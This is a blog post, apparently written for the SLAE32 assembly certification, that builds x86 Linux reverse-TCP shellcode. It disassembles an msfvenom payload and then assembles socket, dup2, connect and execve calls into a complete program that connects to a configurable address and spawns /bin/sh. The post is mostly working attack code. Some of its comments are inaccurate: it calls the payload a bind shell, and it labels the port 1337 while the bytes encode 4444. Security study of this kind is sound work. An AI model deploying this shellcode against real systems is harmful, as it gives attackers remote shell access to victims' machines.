---
title: "SLAE32 0x02: Shell_Reverse_TCP Shellcode"
date: 2019-10-25
category: [SLAE32]
tags: [assembly, c, python, exploit development, reverse shell, linux, SLAE32]
header:
    teaser: "/assets/images/slae/rev_shell.jpg"
---
## Objectives
Create a Shell_Reverse_TCP shellcode that;
1. Connects to an easily configurable IP address and port number
2. Executes a shell on a successful connection

## MSFVenom Shellcode Under the Microscope
In contrast to a bind shell (which is explained in the previous post), a reverse shell is a type of shell in which the system on which the code is run connects a TCP socket to a remote IP address and port that have been designated to listen for incoming connections prior to the execution of the reverse shell. In other words, when a reverse shell is used, the system on which the reverse shell is executed acts as the system that initiates the connection while the remote system acts as the listener. Upon succesful connection to the remote system, a shell is spawned on the system on which the code is run.

We can analyze what a bind or reverse shell would look like by looking at the C function calls. In this case, I thought it would be fun to see what 
msfvenom was doing and to my surprise, I found an interesting artifact while comparing code snippets to my dissassembly. The major difference is that 
in most C code segments that I found, dup2 was being called after `connect`. The syscall order (which may not matter entirely, I don't know yet), 
is `socket`, `dup2`, `connect`, and `execve`. The `dup2` and `connect` may be swappable however, I will stick to the same order that msfvenom uses for consistency.

### Referencing MSF Goodies

```msfvenom -p linux/x86/shell_reverse_tcp -f raw| ndisasm -u -``` produces a bind shell payload the size of 68 bytes for us to compare to our generated shellcode.

```nasm
xor ebx,ebx  
mul ebx  
push ebx  
inc ebx     ; EBX=1 is socket
push ebx  
push byte +0x2 
mov ecx,esp  
mov al,0x66 ; socketcall syscall 
int 0x80    ; interrupt
xchg eax,ebx  
pop ecx  
mov al,0x3f ; dup2
int 0x80    ; interrupt
dec ecx  
jns 0x11  
push dword 0x80fea8c0 
push dword 0x5c110002 
mov ecx,esp  
mov al,0x66 ; socketcall syscall wrapper 
push eax  
push ecx  
push ebx  
mov bl,0x3  ; EBX=3 is connect
mov ecx,esp  
int 0x80    ; interrupt
push edx  
push dword 0x68732f6e 
push dword 0x69622f2f 
mov ebx,esp  
push edx  
push ebx  
mov ecx,esp  
mov al,0xb  ; execve
int 0x80    ; interrupt
```
## Building a Reverse TCP Shell
In this excercise, we will build a bind tcp shell using 4 syscalls. In the previous bind shell blog, 
I called each syscall directly using their hexidecimal referrence rather than using the socketcall wrapper. 
In this exersize, I will use socketcall where possible to learn the difference in usage. According to `man socketcall`, 
we will be using socket call to wrap the `socket` and `connect` syscalls. `dup2` and `execve` will not be wrapped.

### Socketcall System Call Explained

Conveniently, two of the four functions from the list above are all accessible via the socketcall system call. As detailed in man socketcall, the function expects two arguments.

```
#include <linux/net.h>
int socketcall(int call, unsigned long *args);  
```
The call argument determines which socket function to use, and the args argument is a pointer to an area of memory that contains the arguments for the socket function specified by call. For a list of socket functions and their respective values that are passable as the call argument to socketcall, the /usr/include/linux/net.h file should be referenced. The available functions for socketcall are shown below.

```
root@kali:~/workspace/SLAE# grep SYS /usr/include/linux/net.h
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_CONNECT     3               /* sys_connect(2)               */
#define SYS_LISTEN      4               /* sys_listen(2)                */
#define SYS_ACCEPT      5               /* sys_accept(2)                */
...
```

### Socket

```nasm
global _start	; Standard start
		;
section .text	;
_start:		;

xor eax, eax	;
xor ebx, ebx	; Zero out registers before usage to avoid a logic error
xor ecx, ecx	;
xor edx, edx	;

;int socketcall(int call, unsigned long *args)
;*args: (int domain, int type, int protocol) 
;syscall number: 102 (0x66)
;
;Arguement Values:
;EAX -> socketcall sycall 0x66
;EBX -> int call 0x1 = sys_socket
;ECX -> ESP pointer
;STACK *args Values:
;3rd push -> domain = 2 (AF_INET/IPv4)
;2nd push -> type = 1 (SOCK_STREAM/TCP)
;1st push -> protocol = 0 (IPPROTO_TCP)
;

push ebx	; push 0x0
push 0x1	; 1 = SOCK_STREAM
push 0x2	; 2 = AF_INET
mov al, 0x66	; socketcall syscall
mov bl, 0x1	; sys_socket = 1
mov ecx, esp	; *args pointer
int 0x80	; interrupt
```

## Dup2
We can reuse the `dup2` code from our bind shell because all were doing is redirecting stdin, stdout, and stderr.

```nasm
;int dup2(int oldfd, int newfd)
;
;syscall number: 63 (0x3F)
;Arguement Values
;oldfd = previous sockfd value returned by socket
;newfd = 0, 1, 2 iteratively (stdin, stdout, stderr)

xchg ebx, eax   ; swap oldfd into ebx (should be 0x3)
xor ecx, ecx    ; clear eax
mov cl, 3       ; 3 file descriptors (stdin, stdout, stderr)

dup_descriptors:
dec cl  	; hack for loop to work with values 2,1,0 instead of 3,2,1
mul edx 	; zero out eax
mov al, 0x3f	;
int 0x80 	; dup2 stdin
inc cl  	; hack for loop to work with values 2,1,0 instead of 3,2,1
loop dup_descriptors
```

## Connect

```nasm
;int socketcall(int call, unsigned long *args)
;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
;
;syscall number: 102 (0x66) 
;Arguement Values
;EAX -> 0x66 socketcall
;EBX -> 0x3 connect
;ECX -> ESP pointer *args
;IP Socket Address Structure:
;*addr = memory address of structure containing:
;  - sin_family: 0x0002 (AF_INET/IPv4)
;  - sin_port: 0x0539 (1337)
;  - sin_addr.s_addr: 0x0100007f (127.0.0.1)
;addrlen = 0x10 (16/sizeof(sockaddr_in))
;

mov al, 0x66        ; socketcall wrapper
mov bl, 0x3         ; move 3 into ebx
mov edi, 0xffffffff ; 255.255.255.255
mov ecx, 0xfeffff80 ; 128.255.255.254
xor ecx, edi        ; 0x0100007f = 127.0.0.1

push ecx            ; sin_addr.s_addr 127.0.0.1 
push word 0x5c11    ; sin_port 1337
push word 0x02      ; sin_family 0x2
mov ecx, esp        ; move connect *args to ecx. this also points to IP Socket Address Struct 

push 0x10           ; addrlen (socket)
push ecx            ; pointer to IP Struct
push ebx            ; sockfd
mov ecx, esp        ; move esp pointer into ecx
int 0x80            ; interrupt
```

## Execve

```nasm
; EXECVE SHELL
; int execve(const char *filename, char *const argv[], char *const envp[]);
; syscall number: 11 (0xb)
;
; Argument Values:
; *filename = Memory address of a null terminated string "/bin/sh"
; *argv[] = [*"/bin/sh", 0x00000000]
; *envp = NULL
;

push edx                ; delimiting NULL for pathname; EDX is NULL for envp[]
push dword 0x68732f2f   ; push / / s h
push dword 0x6e69622f   ; push / b i n
mov ebx, esp            ; Store pointer to "/bin/sh" in ebx
push edx                ; Push NULL
push ebx                ; Push *filename
mov ecx, esp            ; Store memory address pointing to memory address of "/bin/sh"
mul edx                 ; clear eax
mov al, 0xb             ; execve call
int 0x80                ; interrupt
```
# Complete Assembly Program

```nasm
global _start   ; Standard start
                ;
section .text   ;
_start:         ;

        ;init
        xor eax, eax
        xor ebx, ebx    ; Zero out registers before usage to avoid a logic error
        xor ecx, ecx    ;
        xor edx, edx    ;

        ;socket
        push ebx        ; push 0x0
        push 0x1        ; 1 = SOCK_STREAM
        push 0x2        ; 2 = AF_INET
        mov al, 0x66    ; socketcall syscall
        mov bl, 0x1     ; sys_socket = 1
        mov ecx, esp    ; *args pointer
        int 0x80        ; interrupt

        ;dup2
        xchg ebx, eax   ; swap oldfd into ebx (should be 0x3)
        xor ecx, ecx    ; clear eax
        mov cl, 3       ; 3 file descriptors (stdin, stdout, stderr)

        dup_descriptors:
                dec cl  ; hack for loop to work with values 2,1,0 instead of 3,2,1
                mul edx ; zero out eax
                mov al, 0x3f
                int 0x80 ; dup2 stdin
                inc cl  ; hack for loop to work with values 2,1,0 instead of 3,2,1
                loop dup_descriptors

        ;connect
        mov al, 0x66        ; socketcall wrapper
        mov bl, 0x3         ; move 3 into ebx
        mov edi, 0xffffffff ; 255.255.255.255
        mov ecx, 0xfeffff80 ; 128.255.255.254
        xor ecx, edi        ; 0x0100007f = 127.0.0.1

        push ecx            ; sin_addr.s_addr 127.0.0.1 
        push word 0x5c11    ; sin_port 1337
        push word 0x02      ; sin_family 0x2
        mov ecx, esp        ; move connect *args to ecx. this also points to IP Socket Address Struct 

        push 0x10           ; addrlen (socket)
        push ecx            ; pointer to IP Struct
        push ebx            ; sockfd
        mov ecx, esp        ; move esp pointer into ecx
        int 0x80            ; interrupt

        ;execve
        push edx                ; delimiting NULL for pathname; EDX is NULL for envp[]
        push dword 0x68732f2f   ; push / / s h
        push dword 0x6e69622f   ; push / b i n
        mov ebx, esp            ; Store pointer to "/bin/sh" in ebx
        push edx                ; Push NULL
        push ebx                ; Push *filename
        mov ecx, esp            ; Store memory address pointing to memory address of "/bin/sh"
        mul edx                 ; clear eax
        mov al, 0xb             ; execve call
        int 0x80                ; interrupt
```

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_

